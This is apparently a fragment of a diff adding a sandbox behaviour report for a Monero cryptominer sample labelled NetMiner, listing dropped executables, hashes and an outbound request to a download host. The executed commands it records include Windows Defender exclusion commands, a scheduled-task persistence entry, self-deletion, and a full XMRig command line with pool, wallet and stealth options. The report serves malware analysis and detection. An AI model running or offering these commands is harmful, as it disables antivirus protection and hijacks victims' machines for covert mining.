+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dfw1flq2.oy3.psm1",
+      "sha256": "8bec218a699dbc7f8f540e0ff62601628e9b0dfcd4d05f2882c1ee4f0b7bd78c",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dwvpr1jv.ots.ps1",
+      "sha256": "06a617a7783c07fb02908ed723a0db15afdc1c7a4f1b4bd57ad15c2e36ebe9b8",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ehwww3j4.nwj.ps1",
+      "sha256": "fa3e0aaca82b873e655bea2ff93cfa6f3a4c6486ab6052c53857876dde72f58e",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hp4hbyex.qrt.psm1",
+      "sha256": "3ecfb0138847f1fa808de17e84faf8d906b5d8cf9a1900c60e7544748965d2d3",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hquxlnlz.iuk.ps1",
+      "sha256": "9d1eb3834d562860c1bf8e4adbcf965f32e1832f6c9dade9e540960f85b06258",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_itbaklkq.1um.ps1",
+      "sha256": "5d280a86d5c239f4a2b2f0b64d3c1727ac8f99ed334e01c37eb4fc26fc29396d",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ksnrixfy.zsj.psm1",
+      "sha256": "9756a0acb56ba01037baed7bd5c63715be1690d45dbf62044f5fbf80998f010a",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpnen4uo.0jd.psm1",
+      "sha256": "7daf7c08b5eac7d29a0b9a7515095eaa7946b7fd143acbf6c5e77f888455e152",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_nrjxggv3.fsl.ps1",
+      "sha256": "7ef9fef9bd41021e9b684e72dbd4971e48dc64bb8f0a6736735c2288d2502492",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_prhqhb34.qv1.psm1",
+      "sha256": "9d1eb3834d562860c1bf8e4adbcf965f32e1832f6c9dade9e540960f85b06258",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qopx14lz.jud.ps1",
+      "sha256": "d2eb1f13dfbd6204b4ca67aa7a79df8f9510ea9291b7e7eb8edf22d564fbeb50",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_stnmcojb.0wy.psm1",
+      "sha256": "06a617a7783c07fb02908ed723a0db15afdc1c7a4f1b4bd57ad15c2e36ebe9b8",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_urbqvbub.fom.ps1",
+      "sha256": "9756a0acb56ba01037baed7bd5c63715be1690d45dbf62044f5fbf80998f010a",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_w52umfa4.fgg.psm1",
+      "sha256": "5d280a86d5c239f4a2b2f0b64d3c1727ac8f99ed334e01c37eb4fc26fc29396d",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wceq5fru.aql.ps1",
+      "sha256": "115453343e898072f0b6533f3be55b64254b953d0288f2f870baf3d1e0a9266e",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_z2p22j2q.23w.psm1",
+      "sha256": "fa3e0aaca82b873e655bea2ff93cfa6f3a4c6486ab6052c53857876dde72f58e",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\svchost64.exe",
+      "sha256": "b2a887dbada2082a7e0a8bcbf4294a0970ce52eb65e50569b2b0ef413f7f7e58",
+      "type": "PE_EXE"
+    },
+    {
+      "path": "C:\\Windows\\System32\\services64.exe",
+      "sha256": "03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b",
+      "type": "PE_EXE"
+    },
+    {
+      "path": "C:\\Windows\\System32\\services64.exe:Zone.Identifier",
+      "sha256": "255a65d30841ab4082bd9d0eea79d49c5ee88f56136157d8d6156aef11c12309",
+      "type": "TEXT"
+    }
+  ],
+  "command_executions": [
+    "%SAMPLEPATH%",
+    "\"%ComSpec%\" /c %TEMP%\\svchost64.exe \"%SAMPLEPATH%\"",
+    "%TEMP%\\svchost64.exe  \"%SAMPLEPATH%\"",
+    "\"%windir%\\system32\\services64.exe\" ",
+    "\"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%TEMP%' ",
+    "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%TEMP%'",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%APPDATA%' ",
+    "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%APPDATA%'",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%HOME%' ",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%windir%' ",
+    "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%windir%'",
+    "\"%ComSpec%\" /c schtasks /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"%windir%\\system32\\services64.exe\"' & exit",
+    "schtasks  /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"%windir%\\system32\\services64.exe\"' ",
+    "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%HOME%'",
+    "\"%ComSpec%\" /C choice /C Y /N /D Y /T 3 & Del \"%TEMP%\\svchost64.exe\"",
+    "choice  /C Y /N /D Y /T 3 ",
+    "\"%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe\" ",
+    "\"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%%UserProfile%%' & powershell -Command Add-MpPreference -ExclusionPath '%%AppData%%' & powershell -Command Add-MpPreference -ExclusionPath '%%Temp%%' & powershell -Command Add-MpPreference -ExclusionPath '%%SystemRoot%%' & exit",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%USERPROFILE% ",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming' ",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Local\\Temp' ",
+    "powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Windows' ",
+    "\"C:\\Windows\\System32\\cmd.exe\" /c %USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe \"%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe\"",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe  \"%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe\"",
+    "\"C:\\Windows\\System32\\cmd.exe\" /c schtasks /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"C:\\Windows\\system32\\services64.exe\"' & exit",
+    "schtasks  /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"C:\\Windows\\system32\\services64.exe\"' ",
+    "\"C:\\Windows\\system32\\services64.exe\" ",
+    "\"C:\\Windows\\System32\\cmd.exe\" /C choice /C Y /N /D Y /T 3 & Del \"%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe\"",
+    "choice  /C Y /N /D Y /T 3 ",
+    "\"C:\\Windows\\System32\\cmd.exe\" /c %USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe \"C:\\Windows\\system32\\services64.exe\"",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe  \"C:\\Windows\\system32\\services64.exe\"",
+    "\"C:\\Windows\\system32\\Microsoft\\Libs\\sihost64.exe\" ",
+    "C:\\Windows\\explorer.exe  --cinit-find-x -B --algo=\"rx/0\" --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --url=xmr-eu1.nanopool.org:14433 --user=432nnXcxVAeRoC4NXAjsEcb2wBfdzJyv4dako7sUvUuN1wtr3t94FD4FJq9qpLRVkfaPEjMYiPnHa85WE38RxaFA8opkGCA.{COMPUTERNAME}/bobisoffline123@gmail.com --pass= --cpu-max-threads-hint=40  --cinit-stealth-targets=\"+iU/trnPCTLD3p+slbva5u4EYOS6bvIPemCHGQx2WRUcnFdomWh6dhl5H5KbQCjp6yCYlsFu5LR1mi7nQAy56B+5doUwurAPvCael2sR/N4=\"  --tls  --cinit-stealth "
+  ],
+  "verdict_labels": [
+    "NetMiner"
+  ],
+  "http_conversations": [
+    {
+      "url": "https://sanctam.net:58899/assets/txt/resource_url.php?type=xmrig",
+      "request_method": "CONNECT"
+    }
+  ]
+}
